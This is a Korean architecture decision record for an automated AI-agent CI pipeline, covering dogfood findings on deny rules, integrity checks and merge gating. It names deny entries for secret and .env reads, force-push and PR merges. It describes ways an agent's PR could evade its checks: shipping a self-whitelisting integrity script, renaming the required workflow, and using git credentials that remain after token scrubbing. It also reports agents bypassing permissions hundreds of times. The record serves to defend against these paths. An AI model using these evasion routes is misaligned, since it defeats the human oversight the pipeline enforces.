**보강 — 이월 마감(마이크로 라운드)**: 위 두 번째 한계(기존 저장소에 남는 옛 경로 deny)는 사람 손에 맡기지 않고 설치기가 되돌린다. `factory/cli/install.js`에 옮겨간 22개 항목을 **리터럴로** 적은 `MOVED_DENIES_ADR_019`와 순수 함수 `pruneMovedDenies(settings, moved)`를 두고, `planInstall`의 병합 분기가 **`mode === "upgrade"`일 때만** 병합 전에 그것을 호출한다(최초 `init`은 남의 저장소에 더하기만 하는 연산이라 줄을 지우지 않는다). 제거 수는 `pruned`로 세어 설치 요약 줄에 나오고, 0이 아니면 왜 지웠는지 한 줄을 덧붙인다 — 조용한 삭제는 하지 않는다. 목록을 ci-settings 템플릿에서 유도하지 않는 이유: 그 파일에는 `settings.json`에 산 적 없는 CI 전용 항목(`Bash(gh secret*)`·`Read(.env*)`)이 함께 있어서, 유도하면 사용자가 스스로 넣었을 수도 있는 그 항목까지 지우게 된다 — **우리가 옮긴 것만 되돌린다**. 아직 `--upgrade`를 돌리지 않은 저장소는 doctor의 새 `settings.stale-deny` **WARN**이 알린다(FAIL이 아닌 이유: L2는 좁아진 것이 아니라 여전히 유효하고, 깨진 것은 사람의 스킬이다). 함께, 두 CI 진입점이 **L2를 실을 파일 없이는 에이전트를 띄우지 않는다**: `factory/bin/run-stage.js`는 컨텍스트를 만들기도 전에 `.factory/ci-settings.json` 존재를 확인해 없으면 `factory:needs-human`으로 전이하고 exit 2, `factory/bin/retro.js`는 hydrate보다 먼저 확인해 아무것도 쓰지 않고 exit 2다(커서·`merges_since`가 그대로라 고친 뒤 다음 머지가 같은 창을 다시 본다). `--settings`가 없는 파일을 가리키면 경로 deny가 통째로 빠진 세션이 도는데, 그 사실은 아무 데서도 드러나지 않았다 — 확인되지 않은 강제는 강제가 아니다.

**영향**: §6 표의 "L2 hooks + deny" 행과 §6.3(어느 deny가 어느 파일에 사는지와 그 이유), `templates/factory/claude/settings.json`, `templates/factory/factory/ci-settings.json`, `factory/lib/doctor/factory.js`(`checkSettings`의 `settings.ci-deny`·`settings.stale-deny`), `factory/cli/doctor.js`(ci 템플릿·설치본 로드), `factory/cli/install.js`(`MOVED_DENIES_ADR_019`·`pruneMovedDenies`·`counts.pruned`), `factory/cli/init.js`(요약 줄의 `pruned`), `factory/bin/run-stage.js`·`factory/bin/retro.js`(ci-settings 사전 확인), `factory/hooks/block-dangerous.sh`(F9 주석), `factory/test/templates.test.js`·`doctor-factory.test.js`·`install.test.js`·`run-stage.test.js`·`retro-bin.test.js`, `templates/know-thy-build/harness.md`(doctor 체크 표).

---

## ADR-020 Dogfood 판결 — 2026-09-12 (Plan 6 Task 7, part 1 — 재구성)

Plan 6(데모 저장소 `LeeHyeonKyu/know-thy-build-demo` 도그푸딩 + KTB 자기 자신 + own-calendar) 중에 **실행으로 드러난** 설계 판결을 모은다. 관찰 기록 자체는 `docs/factory/dogfood/2026-09-12-demo.md`(데모)·`2026-09-12-ktb.md`(KTB 자기 자신)이고, 여기에는 그 관찰이 바꾼 **설계**만 적는다. 초판은 발견 순서대로 KTB-5부터 이어 붙인 목록이었다 — 이번 개정(Task 7 part 1)은 같은 판결의 **본문을 한 글자도 줄이지 않고** 여섯 갈래로 다시 묶었을 뿐이다: **① doctor/설치**(KTB-1·2·3·4·11·12) **② 무결성 L0/L1**(KTB-5·6) **③ 산출물 추출**(KTB-7·16·17) **④ 워크플로 동시성·재시작**(KTB-8·9·10·15·15b·18·19·22) **⑤ 권한·훅**(KTB-13·14·20·21) **⑥ 관찰**(O1~O12, O14·O15, G1). 표본·지표의 최종 숫자는 Task 7 part 2가 채웠다(아래 "표본과 지표 (최종)" 절; 라운드 9~11에서 KTB-28~31과 최종 리뷰의 수정이 더해져 ④·⑤·⑥이 늘었고, "1.1 이월" 절이 끝에 붙었다).

### 질문

다크 factory를 실제 GitHub Actions + 구독 토큰으로 세 저장소(데모 그린필드·KTB 자기 자신·own-calendar)에 태웠을 때, 설계가 종이 위에서 옳다고 가정했던 것 중 무엇이 실측에서 깨졌고, 그때마다 "무엇을 판결의 근거로 삼을 것인가"를 어떻게 정했는가.

### 관측 (총괄)

- **실측 소각**: 데모 라운드 3까지 `factory status` 실측으로 **$81.81 / 53 runs**(#2 $45.49 / 11 runs, #8 $36.32 / 39 runs — list-price 환산, 구독 청구라 실비용은 아님). 가장 비싼 두 스테이지(implement $17.07 · review $11.33)의 비용 상당 부분이 권한 우회(KTB-12/13류 — Bash 209회·245회)에서 나왔다: 방벽을 잘못 세우면 비용으로 되돌아온다.
- **결함 19건(KTB-1~19, 재리뷰 라운드 포함) 중 다수가 같은 실수의 변주다**: "판정을 exit code 하나로 뭉쳤다"(KTB-5/6), "두 겹 검사가 서로 다른 git 호출을 쓴다"(KTB-5 fix round 2), "플래그 뭉치의 경계 조건을 놓쳤다"(KTB-13 r1→r2), "재시도가 놓친 창"(KTB-8→10→15b→19). 반복되는 근본 패턴: **한 판정을 두 곳에서 다시 계산할 때, 그 둘이 같은 입력·같은 시점의 세계를 보게 만들지 않으면 갈린다.**
- 그린필드(데모)는 **첫 다크 완주**(이슈 #8 → PR #10, 2026-09-12 17:07Z)까지 도달했다. 브라운필드 둘(KTB 자기 자신·own-calendar)은 **로컬 준비까지만** 끝났고 원격 다크 실행은 사용자 조치 대기로 PARKED다(아래 "PARKED" 절).
- 세부 실측(스테이지별 run id·소요·비용·라벨 전이)은 `docs/factory/dogfood/2026-09-12-demo.md`·`2026-09-12-ktb.md`에 표로 있다 — 이 ADR은 그 실측이 바꾼 설계만 적는다.

### 결정

### ① doctor / 설치 — KTB-1·2·3·4·11·12

Task 1(데모 픽스처)과 Task 2(bootstrap)에서 `factory doctor`·`factory bootstrap` 자체의 판정 로직이 깨졌다 — 전부 "doctor가 실제로 도는 환경(test env·GitHub 조회·brownfield 파일)과 doctor 코드가 가정한 환경이 다르다"는 같은 계열이다.

#### KTB-1 — `factory doctor`가 `[commands]`를 하네스 테스트 환경 **밖에서** 실행했다

**질문**: 데모(M1, `[test.env].compose` 선언)에서 `factory doctor`를 돌리면 `commands.run.unit`이 상시 FAIL이었다 — CI(`.factory/actions/setup`, `test-env: true`)와 로컬 `factory doctor`가 같은 명령을 다른 순서로 실행하고 있었다.

**관측**: doctor가 `[commands]` 게이트 명령을 실행하는 시점이 `envUp`/`envDown`(테스트 환경 기동/종료) 바깥이었다 — DB가 필요한 M1+ 저장소는 컴포즈가 뜨지 않은 채로 유닛 테스트를 돌려 항상 죽는다.

**결정**: `envUp`/`envDown`이 명령 게이트와 스모크를 **한 사이클**로 감싸도록 고쳐, CI와 로컬이 같은 순서(기동 → 게이트/스모크 → 종료)를 갖게 했다.

**알려진 한계**: 없음 — 순서 버그였고 고치는 데 설계 트레이드오프가 없었다.

**영향**: `factory/cli/doctor.js`(envUp/envDown 래핑). 테스트: `doctor-cli.test.js`(`env-wraps-commands`). sha `6e4af3f`.

#### KTB-2 — GitHub Free private repo의 branch protection 403이 두 번 찍히고 exit code가 불명확했다

**질문**: `factory bootstrap`을 GitHub Free 플랜의 private repo에 돌리면 branch protection PUT이 403(`Upgrade to GitHub Pro or make this repository public…`)으로 실패하는데, 그 한 줄이 두 곳(`applyBootstrap`의 `log()` + `bootstrapCommand`의 요약 루프)에서 중복 출력됐고 종료 코드가 무엇을 뜻하는지 불명확했다.

**관측**: 사람이 읽는 출력이 원인(플랜 제약)과 조치(공개 전환 또는 업그레이드)를 명확히 말하지 않으면서 다른 정상 op(라벨 등)의 성공 여부와 섞여 보였다.

**결정**: `bootstrap.js`(cli+lib)가 이 403을 **한 줄만** 찍도록 dedupe하고(`protection main: not available on this plan (private repo on GitHub Free) — make the repo public or upgrade; L0 required-check enforcement is off, L1 (merge script requires all checks GREEN) and L2 still apply`), exit 1을 명확히 하면서도 다른 op은 전부 적용을 유지한다. `doctor`의 `github.protection`도 같은 403을 **FAIL이 아니라 WARN**(플랜 안내)으로 구분한다(404는 그대로 다른 처리).

**알려진 한계**: 플랜 제약은 KTB가 되돌릴 수 없다 — L0가 없는 채로 L1·L2에 의존하는 것이 이 판결의 실질적 결과다(own-calendar에서 같은 조건이 재현된다, 아래 관찰 참조).

**영향**: `factory/cli/bootstrap.js`, `factory/lib/bootstrap.js`, `factory/lib/doctor/factory.js`(`github.protection`). 테스트: `bootstrap.test.js`(fix round 2)·`gh.test.js`·`doctor-factory.test.js`(fix round 2). sha `ca65348`.

#### KTB-3 — env-up 실패 시 스모크는 건너뛰지만 `[commands]`는 그대로 돌아 거짓 결과를 냈다

**질문**: `factory doctor`가 env-up 실패 시 스모크는 건너뛰면서(`envResult.ok` 게이트) `[commands]`는 그대로 실행하는 비대칭이 있었다 — DB가 필요한 M1+ 저장소는 env-up이 죽어도 `commands.run.*`가 환경 없이 돌아 "고칠 수 없는" 거짓 FAIL을 낸다(코드는 정상인데 환경이 없어서 실패로 보인다).

**결정**: `checkCommands`에 `skipReason`을 추가해 env-up 실패 시 각 `commands.run.<k>`를 실행 없이 `FAIL: skipped: test env not up (<reason>)`로 보고하도록 스모크와 대칭을 맞췄다(`envDown`은 그대로 항상 호출).

**알려진 한계**: "환경이 없어서 건너뛴 FAIL"과 "코드가 실제로 깨진 FAIL"이 둘 다 FAIL로 보이므로, 사람은 사유 문자열을 읽어야 구분할 수 있다 — doctor 출력의 등급 자체(PASS/WARN/FAIL)는 나누지 않았다(둘 다 "게이트가 검증되지 않았다"는 점에서 FAIL이 맞다는 판단).

**영향**: `factory/lib/doctor/factory.js`(`checkCommands`). 테스트: `doctor-cli.test.js`(Task 3). sha `ca65348`.

#### KTB-4 — `FACTORY_REPO` 없이 돌리면 doctor가 존재하는 branch protection을 "없다"고 오보했다

**질문**: `factory/cli/doctor.js`가 gh client를 `makeGh({ run, repo: process.env.FACTORY_REPO || "" })`로 만들었다 — 사람이 `FACTORY_REPO` 없이(정상 케이스) `factory doctor`를 돌리면 `repo`가 `""`가 돼 `gh api repos//branches/main/protection`이 실패하고, 그 non-403 실패가 `null`로 떨어져 실제로는 존재하는 branch protection(`contexts=["factory/integrity"]`)을 `github.protection — branch protection is missing L0 contexts: factory/integrity`로 오보했다.

**결정**: `status.js`가 이미 하던 해석(`FACTORY_REPO` → `gh repo view --json nameWithOwner`)을 `resolveRepo({ run })`로 `factory/lib/gh.js`에 공유 추출해 `doctor.js`·`status.js` 둘 다 쓰게 했다. 해석 자체가 실패하면(로그인 안 됨·git repo 아님) `github.*` 전체를 건너뛰고 `github.unavailable` WARN 하나로 남긴다(오프라인 허용, 오보 아님). `bootstrap.js`/`run.js`/`factory/bin/*.js`도 같은 `|| ""` 패턴을 찾아봤으나 전부 이미 `FACTORY_REPO || gh repo view` 인라인 방식을 쓰고 있어 결함이 없었다(추가 수정 없음).

**알려진 한계**: 없음 — 단일 출처로 통합해 재발 가능성을 없앴다(같은 계산을 두 곳에서 다시 하지 않는다는 이 ADR의 반복 원칙).

**영향**: `factory/lib/gh.js`(`resolveRepo`), `factory/cli/doctor.js`. 테스트: `gh.test.js`(resolveRepo 유닛 3건)·`doctor-cli.test.js`(KTB-4 2건). sha `09fb3e6`.

#### KTB-11 — `files.stale`이 병합 대상 파일(`.claude/settings.json`)까지 바이트로 비교하고 있었다

**질문**: 브라운필드 저장소에서 `factory doctor`를 돌리면 `.claude/settings.json`이 사람이 정당하게 추가한
deny/allow/훅을 갖고 있어도 `files.stale` WARN이 영구히 뜬다. `manifest.js`는 이 파일을 `merge: "settings"`로
표시하고 init/upgrade는 `mergeSettings`(합집합)로만 이 파일을 건드리는데, `checkFiles`는 `owner === "factory"`인
모든 항목을 템플릿 렌더 결과와 바이트로 비교한다 — "병합 대상"이라는 사실 자체를 몰랐다.

**결정**: `checkFiles`가 `e.merge === "settings"` 항목만 다른 규칙으로 판정한다(`factory/lib/doctor/factory.js`
`settingsIsStale`) — `mergeSettings(installed, template)`를 다시 계산해 그 결과가 설치된 파일과 **다를 때만**
stale이다(사람이 자기 항목을 더 넣었어도 템플릿 항목을 전부 갖고 있으면 병합 결과는 설치본과 같다).
JSON으로 못 읽는 파일(사람이 손으로 깨뜨린 경우 등)은 이전 동작(바이트 비교)으로 안전하게 되돌아간다.
`mergeSettings`는 `factory/cli/install.js`의 기존 순수 함수를 그대로 재사용한다 — 판정 두 곳(설치기·doctor)이
갈리면 "병합됐다"와 "stale이 아니다"가 서로 다른 답을 낼 수 있다.
테스트: `doctor-factory.test.js`(customized-but-complete → PASS, 훅 하나 누락 → WARN, 바이트 동일 → PASS 회귀).

#### KTB-12 — `factory doctor`는 설치된 파일이 디스크에 있는지만 봤지, git이 실제로 추적하는지는 보지 않았다

KTB 자신의 `.gitignore`가 `.claude/commands/`를 통째로 무시해 `factory init`이 쓴 `.claude/commands/factory-*.md` 디스패처가 커밋되지 않았고, CI 체크아웃에는 그 파일이 없어 모든 `claude -p /factory-<stage>` 호출이 실패하는 결함으로 발견됐다. `checkFilesTracked`(`files.tracked`)가 `git check-ignore --stdin`으로 설치된 manifest 파일이 gitignore에 가려졌는지 배치 검사하고, KTB의 `.gitignore`는 `.claude/commands/`를 `.claude/commands/*`로 바꿔(디렉터리 단위 제외는 자식 파일의 negation을 무시한다는 git의 알려진 제약 때문) `!.claude/commands/factory-*.md`로 다섯 디스패처만 되돌렸다.

**리뷰 leftover(M2/M3)**: KTB-16의 "키가 없으면 WARN" 약속이 `checkHarness`에만 있었다 — `doctor.js`는 언제나 `loadHarness`(기본값 12 채움) 결과만 넘겼으므로 그 WARN은 실제로는 **한 번도 발화하지 않았다**. `loadHarnessRaw`(기본값 채움 이전 파스)를 doctor.js가 따로 읽어 `checkHarness({ raw })`로 넘기게 고쳤다. 같이, `[factory.max_turns_by_stage]`의 알 수 없는 스테이지 이름(오타)은 `stageMaxTurns`가 조용히 무시하고 공통값으로 떨어지므로 — run-stage의 `STAGES` + `retro`(`bin/retro.js`의 `stageMaxTurns(harness,"retro")`) 밖의 키를 이름으로 WARN한다(`factory.max_turns_by_stage.keys`). 영향: `factory/lib/config.js`(`loadHarnessRaw`), `factory/lib/doctor/harness.js`, `factory/cli/doctor.js`. 테스트: `doctor-harness.test.js`.

### ② 무결성 L0/L1 — KTB-5·6

`factory/integrity`가 branch protection의 유일한 required context라는 사실 하나가 두 번 같은 방식으로 사람의 머지를 막았다 — 처음은 보호 경로 변경(KTB-5), 두 번째는 역할 프롬프트의 additive-only 규칙(KTB-6). 두 판결과 재리뷰에서 나온 보강 두 건을 함께 묶는다.

#### KTB-5 — integrity 체크(L0)는 변조만 본다; 보호 경로 변경은 L1이 사람에게 넘긴다

**질문**: `factory/integrity` 체크는 `[protected].factory` 매치 파일이 diff에 있으면 `protected path changed` 위반으로 exit 1 했다. 그런데 이 체크는 branch protection에 등록된 **유일한** required context다(ADR-015 보강: `bootstrap`이 `required_status_checks.contexts = ["factory/integrity"]`, `enforce_admins: true`). 그러면 보호 경로를 건드린 PR은 **누구도** 머지할 수 없다 — 관리자도, 사람도. 그런데 설계가 전제하는 사람 머지 경로는 전부 보호 경로를 건드린다. 스펙의 의도(§5.1, ADR-015)는 "봇의 자동 머지를 막고 사람이 머지하게 한다"인데, 구현은 사람까지 막고 있었다. 이 둘을 어떻게 가르는가.

**관측**:

- **실측**: 데모 PR #1(`chore(factory): init --upgrade`, `.factory/**` 갱신)의 `factory/integrity`가 RED였고, `enforce_admins: true` 아래에서 그 PR은 머지 불가 상태였다. 같은 이유로 막히는 것이 최소 세 종류다 — retro의 `factory:retro-proposal` PR(CHARTER·역할·임계값 편집), `factory:harness` 승격 PR(`harness.toml` 편집, §5.2.1), 그리고 사람-지점 스킬(`:harness`·`:role`·`:technical`, ADR-019)이 만드는 모든 PR. **ADR-019가 "그런 PR은 `needs-human`이 되어 사람이 머지한다"고 적은 그 경로가 실제로는 존재하지 않았다.**
- 원인은 한 함수가 **두 가지 다른 질문**에 같은 exit code로 답한 것이다. ① "이 diff가 규칙을 **변조**했는가"(additive-only 위반, 위조된 `## ` 헤더, lessons 포맷·상한·근거, 테스트 skip/ignore pragma) — 이것은 사람이 머지하든 봇이 머지하든 **틀린 것**이고 RED가 옳다. ② "이 diff가 보호 경로를 **바꿨는가**" — 이것은 틀린 것이 아니라 **누가 머지해야 하는가**의 문제다. 사람이 게이트 정의를 바꾸는 것은 위반이 아니라 그 스킬들의 존재 이유다(ADR-019의 문장 그대로: "사람의 판단 자체가 판결이다").
- 두 질문을 나눌 자리는 이미 층으로 나뉘어 있었다. ①은 커밋에 대한 사실이라 **L0**(모든 PR에 도는 CI 체크)에 맞고, ②는 "지금 이 봇이 머지해도 되는가"라 **L1**(merge 스테이지, 자동 머지 직전)에 맞다. L1은 봇만 통과하는 문이므로 사람의 머지를 구조적으로 막을 수 없다.
- **L1이 PR 자신의 코드로 판정하면 안 된다.** merge 스테이지는 `checkoutHead`로 워킹 트리를 PR head에 detach한 상태로 돈다(ADR-015 R6) — 그 트리에는 PR이 실은 `.factory/bin/integrity.js`와 `.factory/harness.toml`이 있다. 하위 프로세스로 그 파일을 실행하면 에이전트 PR이 자기를 화이트리스트하는 integrity를 실어 보낼 수 있다. 실제로는 이미 안전했다: `run-stage.js`는 ESM import를 **프로세스 시작 시점**(= 워크플로의 기본 체크아웃, base 브랜치)에 해석하고 `harness`도 `charterReady`가 `checkoutHead`보다 먼저 읽는다. 이 성질은 우연이 아니라 **불변식**이므로 코드 주석과 이 ADR에 못 박는다 — 판정은 base 브랜치의 코드와 base 브랜치의 `[protected]` 목록으로 한다.
- 판정에 **파일 내용을 읽을 필요가 없다**. "어떤 경로가 바뀌었나"는 `git diff --name-status <base>...<head>` 하나로 답이 나온다. 내용을 읽으면 PR head 트리가 판정 재료가 되므로, L1 전용 계산은 name-status만 본다(`integrityCheck`의 `git diff -U0` + `readFile`은 L0 전용으로 남는다).
- `additive_only`가 맡은 파일(`.claude/agents/*.md`의 `## Examples`/`## Perspectives`)은 보호 목록에 넣지 않는다 — 넣으면 retro의 **다크** 예시/관점 추가(§8.1, ADR-017 P4-R2)가 매번 사람 머지가 되어 다크 경로가 사라진다. 그 파일의 판정은 additive-only 규칙(L0)이 이미 하고 있다.
- 거꾸로, `integrityCheck.ok`가 더는 보호 경로를 보지 않게 되면서 retro의 **로컬 선검사**에 구멍이 생긴다: 다크 lessons PR이 보호 경로를 실어도 GREEN이 될 수 있다. `splitDarkFiles`가 이미 경로를 제한하지만, 다크 PR은 정의상 사람 승인 없이 머지되므로 두 번째 문이 필요하다.

**결정**:

1. **`factory/lib/integrity.js`** — `integrityCheck(...)`는 `{ ok, violations, protected, checked }`를 돌려준다. `violations`(그리고 `ok`)는 **변조만** 담는다: additive-only 위반, "header added", lessons 포맷, 테스트 skip/ignore pragma, 그리고 판정 불가(cannot-compute는 여전히 fail-closed `ok:false`). `protected`는 `[protected].factory` 매치에서 `except`와 `additive_only`를 뺀 파일 목록이고 `ok`에 영향을 주지 않는다. `protected path changed`라는 위반 규칙은 사라진다.
2. **`factory/bin/integrity.js`(L0 체크)** — `ok`로만 exit한다. 보호 경로가 있으면 잡 로그에 `integrity: protected paths changed (human merge required): <files>` 한 줄을 **찍기만** 한다. 체크 상태를 고쳐 쓰지도, PR에 코멘트를 달지도 않는다(`factory-integrity.yml`의 `permissions: contents: read`는 그대로 — 권한을 늘리지 않는다).
3. **`factory/lib/merge-stage.js`(L1)** — 필수 체크·무결성 확인(4단계) **뒤**, 실제 머지(5단계) **앞**에 단계 (4b)를 둔다. `d.protectedPaths()`가 `{ok:true, files:[...]}`이고 `files`가 비어 있지 않으면 머지하지 않고 `factory:needs-human`으로 전이한다 — 사유 `protected paths changed — human merge required: <files>`, 그리고 파일을 나열한 코멘트(best-effort, 실패해도 거부를 잃지 않는다), exit 2(다른 머지 거부와 동일). `ok:false`(계산 실패)와 **dep 부재**도 통과가 아니라 거부다(fail closed).
4. **base 브랜치 코드로 계산한다** — `run-stage.js`의 `protectedPaths` dep은 프로세스 시작 시 import된 `factory/lib/integrity.js`의 `protectedPaths()`와 `charterReady`가 읽은 `harness`를 쓴다(둘 다 `checkoutHead` **이전**). `node .factory/bin/integrity.js`를 하위 프로세스로 부르지 않는다.
5. **`factory/lib/retro/publish.js`** — 다크 lessons PR의 로컬 선검사가 `integrity.protected.length > 0`이면 push도 PR도 하지 않는다(`integrity: protected paths in a dark PR (never auto-merged): …`). 값싼 assert 하나로 두는 방어선이다.

**보강 — fix round 1(리뷰 판결)**: 초판에는 구멍 셋이 있었다.

6. **rename/copy는 출발지가 보호 경로다.** `git diff --name-status`의 rename 줄은 `R096\t<old>\t<new>`인데 초판의 파서가 **마지막** 필드만 취했다 — 그래서 `.github/workflows/factory-integrity.yml`을 `ci-integrity.yml`로 **옮기면서** 본문을 무력화하는 PR은 목적지가 보호 경로가 아니라 L0(자기 워크플로)·변조 검사·보호 경로 검사를 **전부** 통과해 자동 머지되고, required 체크 자신이 사라진다. 두 겹으로 막는다: (a) 두 함수 모두 `git diff --no-renames --name-status`로 묻는다(같은 변경이 `D <old>` + `A <new>`로 나온다. git config `diff.renames`도 이 플래그가 이긴다), (b) 파서는 한 줄의 **모든** 경로 필드를 취한다(플래그가 빠진 호출·다른 git 버전에 대비). 훅에도 같은 구멍이 있었다 — `block-dangerous.sh`가 `git rm`/`git mv`를 보호 경로에 대해 막는다(내용을 한 글자도 안 바꾸고 그 경로가 하는 일을 없애는 가장 싼 방법이었다).
7. **보호 경로 검사는 게이트보다 먼저 돈다.** 초판은 (4b)를 `mergeGates` 뒤에 뒀는데, 그 앞의 `d.gates()`는 `harness.commands`를 bash로 실행한다 — 곧 **PR이 쓴 코드를 머지 잡 안에서 돌린다**. 보호 경로를 실은 PR은 애초에 자동 머지 후보가 아니므로, 그 코드가 한 줄도 실행되기 전에 거른다. 단계 번호도 (3)으로 올렸다.
8. **게이트 하위 프로세스는 머지 권한을 물려받지 않는다.** 그래도 정상 PR의 게이트는 여전히 PR 코드를 실행하므로, `lib/exec.js`에 `scrubEnv`/`scrubbedRunner`를 두고 `runStageGates`가 주입받은 실행기를 한 번 감싼다 — `GH_TOKEN`·`GITHUB_TOKEN`·`FACTORY_BOT_TOKEN`·`FACTORY_MERGE_TOKEN`·`CLAUDE_CODE_OAUTH_TOKEN`·`ANTHROPIC_API_KEY`가 자식 env에서 빠지고(`run()`의 새 `replaceEnv` 옵션이 `process.env`를 다시 얹지 않는다) `PATH`·`HOME`·`CI` 등 나머지는 그대로 남는다. 엄격한 allowlist가 아닌 이유: 게이트 명령은 남의 저장소의 빌드 명령이라 무엇이 필요한지 우리가 알 수 없고, 모르는 것을 지우면 게이트가 환경 문제로 RED가 되어 "코드가 틀렸다"로 잘못 읽힌다.
9. **거부의 자리와 종류를 바로잡았다.** 상세 코멘트는 **PR**에 붙는다(사람이 머지 버튼을 누르는 자리이고 본문이 그 diff를 가리킨다); 이슈에는 전이 사유 한 줄이 PR 번호와 함께 남는다. 그리고 보호 경로 검사의 **계산 실패**(git 실패·merge-base 없음·dep 미배선)는 `needs-human`이 아니라 `factory:blocked`다 — 게이트·mergeGates의 typed-error와 같은 처리다(needs-human은 "사람이 판단할 것이 있다"는 뜻이고, 여기서는 판단할 재료 자체가 없다).

**알려진 한계**: L0가 보호 경로로 RED가 되지 않으므로, **머지 스테이지를 타지 않는 봇**이 보호 경로를 머지하는 것을 L0는 더 이상 막지 않는다 — 그 방어는 이제 (a) `gh pr merge*`를 막는 L2 deny, (b) 머지 권한이 있는 토큰이 merge 스테이지 스크립트에만 주어진다는 것(ADR-015 R2·R3), (c) L1의 이 (3) 단계에 걸려 있다. 토큰이 새면 L0는 이 한 가지를 더는 잡지 않는다. 그것을 되살리는 유일한 방법(보호 경로 RED)은 사람의 머지까지 막는 것이라 채택할 수 없었다 — 이 교환은 의도된 것이다. 또한 (3)은 `harness.toml [protected]`를 base 브랜치에서 읽으므로, 보호 목록 자체를 **좁히는** PR은 그 PR이 머지된 **다음** 런부터 효력을 갖는다(그 PR 자신은 `harness.toml`을 건드리므로 반드시 사람이 머지한다 — 순환이 없다).

**알려진 한계 — 머지 잡은 PR이 쓴 코드를 실행한다**(fix round 1에서 정직하게 적는다). 보호 경로가 없는 PR이라도 merge 스테이지는 `d.gates()`에서 `harness.commands`를 bash로 돌린다 — 그 명령이 가리키는 스크립트·설정은 PR head 트리의 것이다. 즉 "머지 직전 검증"은 구조적으로 **PR이 통제하는 코드를 머지 권한이 있는 잡 안에서 실행하는 일**이고, 이것은 아키텍처의 성질이지 이번 판결이 만든 것이 아니다. 지금 걸려 있는 완화는 넷이다: (a) 보호 경로 검사가 **게이트보다 먼저** 돌아, 게이트 정의(`harness.toml`·`package.json`·러너 config)를 바꾼 PR의 코드는 애초에 실행되지 않는다(위 7번); (b) 게이트 하위 프로세스의 env에서 머지 가능 자격증명이 빠진다(위 8번) — 그 프로세스는 `gh pr merge`를 인증할 수단이 없다; (c) `gh pr merge*`·`git push --force*`를 막는 L2 deny와 `block-dangerous.sh`(모든 세션에 걸리는 L0 훅); (d) 머지 권한 토큰이 merge 워크플로의 스텝 env에만 주어진다는 것(ADR-015 R2·R3). 남는 구멍: 게이트 명령이 **러너 자체**(GitHub Actions 러너의 파일시스템·`GITHUB_ENV`·워크플로 캐시)에 손을 댈 수 있고, self-hosted 러너라면 그 영향이 잡을 넘어 지속된다 — 여기에 대한 답은 격리(ephemeral 러너/컨테이너)이지 env 스크럽이 아니며, 이 스펙의 범위 밖이다.

스크럽의 대가와 경계도 적어 둔다(fix round 2에서 명시): **(가)** 스크럽은 `runStageGates`에 걸려 있으므로 merge뿐 아니라 implement·review의 게이트에도 똑같이 적용된다 — `GH_TOKEN`/`GITHUB_TOKEN`이 필요한 게이트 명령(사설 레지스트리 인증, 빌드 스크립트 안의 `gh`)을 쓰는 저장소는 **모든 스테이지에서** 그 게이트가 RED가 된다. 스테이지별로 달리 하지 않는 이유: implement의 게이트도 같은 PR 코드를 실행하고, 그 잡의 토큰도 라벨을 옮기고 코멘트를 달 수 있다. 필요하면 `[commands]`가 쓸 자격증명은 그 이름으로 따로 주입해야 한다(스크럽 목록은 리터럴이라 다른 이름은 지우지 않는다). **(나)** 스크럽은 env만 지운다 — `actions/checkout`이 `.git/config`에 심는 `http.https://github.com/.extraheader` 자격증명은 **그대로 남는다**. 즉 게이트 명령은 여전히 `git push`를 인증할 수 있고, 그것을 막는 것은 스크럽이 아니라 branch protection(force-push 금지·linear history·required check)과 L2 deny다. 지우려면 `git config --unset`이 필요한데 그러면 스테이지 자신의 push·fetch가 깨진다. **(다)** `spawnBackground`(`lib/exec.js`)에는 스크럽이 없다 — 오늘 그 함수를 부르는 것은 `[test.env]`의 base 코드 경로뿐이고 토큰을 쓰지 않지만, 앞으로 PR이 통제하는 명령을 여기로 태우면 같은 처리를 해야 한다.

**영향**: `factory/lib/integrity.js`(`protected` 필드·`protectedPaths()`·`isProtected`·`NAME_STATUS`의 `--no-renames`·모든 경로 필드를 취하는 `changedFiles`), `factory/bin/integrity.js`(notice 줄), `factory/lib/merge-stage.js`(단계 (3)·deps 계약), `factory/bin/run-stage.js`(`protectedPaths`·`comment(number, body)` dep), `factory/lib/retro/publish.js`(다크 PR assert), `factory/lib/exec.js`(`MERGE_CAPABLE_ENV`·`scrubEnv`·`scrubbedRunner`·`run()`의 `replaceEnv`), `factory/lib/gates.js`(`runStageGates`가 실행기를 감싼다), `factory/hooks/block-dangerous.sh`(보호 경로의 `git rm`/`git mv`), `factory/test/integrity.test.js`·`merge-stage.test.js`·`run-stage.test.js`·`retro-publish.test.js`·`exec.test.js`·`gates.test.js`·`hooks.test.js`, 스펙 §5.1(`[protected]` 주석과 설명 문장)·§6 표의 L0/L1 행·§6.1(`factory/integrity`가 보는 것)·§6.2(merge 스테이지의 보호 경로 거부), ADR-015(보강 한 줄). 프롬프트·스킬 드리프트도 함께 고쳤다("integrity가 PR을 거절한다" → "merge 스테이지가 자동 머지를 거부하고 사람이 머지한다"): `templates/factory/claude/agents/factory-builder.md`, `templates/factory/claude/workflows/factory-implement.js`, `templates/know-thy-build/role.md`·`harness.md`·`project.md`, `templates/factory/factory/harness.toml`. 템플릿 워크플로는 바뀌지 않는다 — `factory-integrity.yml`은 권한을 늘릴 이유가 없고, `factory-merge.yml`은 이미 `fetch-depth: 0`으로 base…head diff를 계산할 수 있다.

#### KTB-6 — `additive_only`도 L0 변조 규칙이 아니다: 역할 프롬프트 변경을 사람도 머지할 수 없었다

**질문**: KTB-5가 보호 경로를 L1으로 옮긴 직후, 데모 PR #3(그 수정을 실어 나르는 평범한 `factory init --upgrade`)이 다시 `factory/integrity` RED로 떨어졌다. 이번 원인은 `[protected].additive_only = { ".claude/agents/*.md" = ["## Examples", "## Perspectives"] }`가 여전히 **L0 변조 규칙**이었다는 것이다 — KTB-5의 프롬프트 드리프트 수정이 `factory-builder.md`의 `## You must not`을 고쳤고, 그것이 허용 섹션 밖이라 위반이 됐다. KTB-5와 같은 질문이 다시 나온다: 이것은 커밋에 대한 사실인가, 아니면 누가 머지해도 되는가의 정책인가.

**관측**:

- **실측**: `gh run view 34692991112 --repo LeeHyeonKyu/know-thy-build-demo --log-failed`의 출력에서 `violations`는 정확히 한 줄 — `.claude/agents/factory-builder.md: additive-only sections (## Examples, ## Perspectives) — removals or edits outside allowed sections` — 이었고, `protected` 7개는 KTB-5대로 알림으로만 나왔다(`integrity: protected paths changed …`). 즉 KTB-5의 수정은 정확히 동작했고, 남은 한 규칙이 같은 방식으로 문을 막고 있었다.
